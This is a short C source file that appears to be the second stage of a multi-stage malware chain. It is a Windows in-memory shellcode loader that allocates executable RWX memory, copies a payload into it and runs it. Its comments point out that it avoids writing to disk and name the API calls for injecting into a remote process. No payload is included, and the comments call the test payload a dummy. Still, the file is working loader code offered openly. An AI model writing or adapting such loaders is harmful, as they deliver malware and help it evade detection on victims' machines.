/**
 * Stage2_Loader.c - In-memory Shellcode Loader (Stage 2)
 * Description: Allocates memory and injects the shellcode payload, then executes it within the current process.
 *              It avoids writing the payload to disk (memory-only execution). Could be adapted for remote process injection.
 */
#include <windows.h>
#include <stdio.h>

// Allocate and execute shellcode in the current process.
// (For remote injection, one would use OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, etc.)
void LoadShellcode(unsigned char *shellcode, size_t len) {
    // Allocate RWX memory for the shellcode
    LPVOID execMem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        printf("[Stage2] Failed to allocate memory for shellcode.\\n");
        return;
    }
    // Copy shellcode bytes into the allocated memory region
    memcpy(execMem, shellcode, len);
    // Flush the instruction cache to ensure the CPU sees the new code
    FlushInstructionCache(GetCurrentProcess(), execMem, len);
    
    // Execute the shellcode:
    // In a real scenario, we might spawn a new thread or process for the shellcode.
    // Here, we'll directly call it as a function (since our dummy payload is safe).
    printf("[Stage2] Shellcode is now executing...\\n");
    typedef void (*ShellcodeFunc)();
    ShellcodeFunc func = (ShellcodeFunc) execMem;
    __try {
        func();  // Call the shellcode like a function (assumes payload is safe to execute)
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        // Catch any exception (e.g., if payload crashes or is invalid)
        printf("[Stage2] Exception occurred during shellcode execution (the payload might be invalid).\\n");
    }
    
    // Note: For remote process injection, we would not call the function in our process.
    // Instead, we'd create a remote thread in the target process to execute the shellcode there.
}
